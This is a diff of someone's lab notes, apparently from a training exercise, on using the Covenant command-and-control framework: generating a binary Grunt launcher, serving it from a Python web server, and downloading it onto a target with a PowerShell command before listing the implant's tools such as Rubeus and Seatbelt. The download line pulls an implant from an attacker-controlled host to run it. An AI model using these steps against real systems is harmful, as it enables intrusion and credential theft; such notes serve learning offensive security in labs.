@@ -72,3 +72,34 @@ docker ps -a
 docker rm covenant
 ```
 
+
+![[Pasted image 20240429211001.png]]
+
+Will go in Launchers and select Binary
+![[Pasted image 20240429211101.png]]
+
+Will click on generate
+![[Pasted image 20240429211518.png]]
+
+Will Login to the PS shell and will upload our luncher file and try to run it and see if we get a connection or not.
+
+I simply hosted a python3 server and downloaded the file simply
+```
+ python3 -m http.server 8080
+```
+![[Pasted image 20240429212547.png]]
+
+```
+IWR -Uri http://10.10.16.20:8080/GruntHTTP.exe -OutFile pleasesub.exe
+```
+![[Pasted image 20240429212509.png]]
+
+Grunt
+```
+help
+```
+![[Pasted image 20240429212708.png]]
+
+We have different commands like Rubeus , Seat Belt
+![[Pasted image 20240429212821.png]]
+
